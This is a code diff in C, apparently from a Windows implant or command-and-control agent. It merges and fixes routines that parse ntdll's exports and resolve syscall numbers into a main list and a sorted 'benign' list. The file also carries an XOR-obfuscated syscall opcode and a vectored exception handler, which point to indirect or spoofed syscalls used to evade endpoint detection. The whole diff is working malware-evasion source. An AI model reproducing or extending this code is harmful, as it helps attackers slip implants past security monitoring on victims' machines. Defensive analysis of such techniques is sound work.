@@ -16,8 +16,13 @@ CRITICAL_SECTION g_CriticalSection = { 0 };
 PVOID g_VehHandler = NULL;
 LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);
 volatile unsigned short g_SYSCALL_OPCODE = 0x405D; // 0x050F ^ 0x2325
+#if defined(_WIN64)
+#define SEARCH_BYTES 0x8b4c
+#else
+#define SEARCH_BYTES 0x00b8
+#endif
 
-BOOL PopulateSyscallList() {
+BOOL PopulateSyscallLists() {
 
     PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
     PDWORD				        pdwFunctionNameArray		    = NULL;
@@ -27,8 +32,11 @@ BOOL PopulateSyscallList() {
     if(g_SyscallList == NULL)
         g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we do not already have memory reserved for our list
 
-    if(g_SyscallList->u32Count)
-        return TRUE; // our list is already populated
+    if(g_BenignSyscallList == NULL)
+        g_BenignSyscallList = (pBENIGN_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(BENIGN_ENTRY_LIST)); // we do not already have memory reserved for our list
+
+    if(g_SyscallList->u32Count && g_BenignSyscallList->u32Count)
+        return TRUE; // our lists are already populated
 
     pExportDirectory = GetExportDirectoryAddress(agent->apis->hNtdll);
 
@@ -41,10 +49,28 @@ BOOL PopulateSyscallList() {
 
         LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);
 
-        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) {
-            g_SyscallList->Entries[g_SyscallList->u32Count].dw64Hash	= Rotr64HashA(pFunctionName);
-            g_SyscallList->Entries[g_SyscallList->u32Count].uAddress	= (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
+        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) { // we've found a syscall name.
+            ULONG_PTR uAddress = (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]); // obtain address pointer
+            DWORD wBytes = *(DWORD*)uAddress; //obtain the first 2 bytes of the func.
+            DWORD64 dw64Hash = Rotr64HashA(pFunctionName); //obtain the function hash
+
+            g_SyscallList->Entries[g_SyscallList->u32Count].dw64Hash	= dw64Hash; // populate our reg syscall list no matter what
+            g_SyscallList->Entries[g_SyscallList->u32Count].uAddress	= uAddress;
             g_SyscallList->u32Count++;
+
+            if((wBytes & SEARCH_BYTES) == SEARCH_BYTES) { // we've found a benign syscall. populate the entry in benign list.
+                for(int j = 0; j < 0x20; j++) { //loop until we find the syscall.
+                    wBytes = *(DWORD*)(uAddress + j); // update bytes.
+                    if((wBytes & 0x000000B8) == 0x000000B8) { // syscall found.
+                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].dw64Hash	= dw64Hash; //populate our benign syscall.
+                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress	= uAddress;
+                        g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(DWORD*)(uAddress + j + 1);
+                        g_BenignSyscallList->u32Count++;
+                        break;
+                    }
+                }
+            }
+
         }
     }
 
@@ -68,47 +94,6 @@ BOOL PopulateSyscallList() {
         }
     }
 
-    return TRUE; // populated and sorted.
-}
-
-BOOL PopulateBenignSyscallList() {
-    PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
-    PDWORD				        pdwFunctionNameArray		    = NULL;
-    PDWORD				        pdwFunctionAddressArray		= NULL;
-    PWORD				        pwFunctionOrdinalArray		= NULL;
-
-    if(g_BenignSyscallList == NULL)
-        g_BenignSyscallList = (pBENIGN_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(BENIGN_ENTRY_LIST)); // we do not already have memory reserved for our list
-
-    if(g_BenignSyscallList->u32Count)
-        return TRUE; // our list is already populated
-
-    pExportDirectory = GetExportDirectoryAddress(agent->apis->hNtdll);
-
-    pdwFunctionNameArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNames);
-    pdwFunctionAddressArray	= (PDWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfFunctions);
-    pwFunctionOrdinalArray	= (PWORD)((LPBYTE)agent->apis->hNtdll + pExportDirectory->AddressOfNameOrdinals);
-
-    //populate our list of benign syscalls.
-    for(int i = 0; i < pExportDirectory->NumberOfNames; i++) {
-        LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);
-        if(*(unsigned short*)pFunctionName == 'wZ') {
-            g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].dw64Hash	= Rotr64HashA(pFunctionName);
-            g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress	= (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
-
-
-            for(int i = 0; i< 0x20; i++) {
-                g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(unsigned short*)(g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress + i);
-                if((g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN & 0x00B8) == 0x00B8) {
-                    g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].SSN = *(unsigned short*)(g_BenignSyscallList->Entries[g_BenignSyscallList->u32Count].uAddress + i + 1);
-                    break;
-                }
-            }
-
-            g_BenignSyscallList->u32Count++;
-        }
-    }
-
     // sort our list of benign syscalls by SSN instead of address.
     // bubble sort SSNs. This will inherently give us the addresses in the correct order.
     // additionally, the SSN will become the index of the syscall in the list.
@@ -119,7 +104,7 @@ BOOL PopulateBenignSyscallList() {
 
             if (g_BenignSyscallList->Entries[j].SSN > g_BenignSyscallList->Entries[j + 1].SSN) {
 
-                BENIGN_SYSCALL_ENTRY TempEntry = { .dw64Hash = g_BenignSyscallList->Entries[j].dw64Hash, .uAddress = g_SyscallList->Entries[j].uAddress, .SSN = g_BenignSyscallList->Entries[j].SSN };
+                BENIGN_SYSCALL_ENTRY TempEntry = { .dw64Hash = g_BenignSyscallList->Entries[j].dw64Hash, .uAddress = g_BenignSyscallList->Entries[j].uAddress, .SSN = g_BenignSyscallList->Entries[j].SSN };
 
                 g_BenignSyscallList->Entries[j].dw64Hash = g_BenignSyscallList->Entries[j + 1].dw64Hash;
                 g_BenignSyscallList->Entries[j].uAddress = g_BenignSyscallList->Entries[j + 1].uAddress;
@@ -133,12 +118,12 @@ BOOL PopulateBenignSyscallList() {
         }
     }
 
-    return TRUE;
+    return TRUE; // populated and sorted.
 }
 
 DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {
 
-    if(!PopulateSyscallList())
+    if(!PopulateSyscallLists())
         return 0x00;
 
     for (int i = 0; i < g_SyscallList->u32Count; i++) {
@@ -150,7 +135,7 @@ DWORD FetchSSNFromSyscallEntries(DWORD64 dw64Hash) {
 }
 
 DWORD FetchSSNFromSyscallEntriesViaAddress(ULONG_PTR pAddress) {
-    if(!PopulateSyscallList())
+    if(!PopulateSyscallLists())
         return 0x00;
 
     for(int i = 0; i< g_SyscallList->u32Count; i++) {
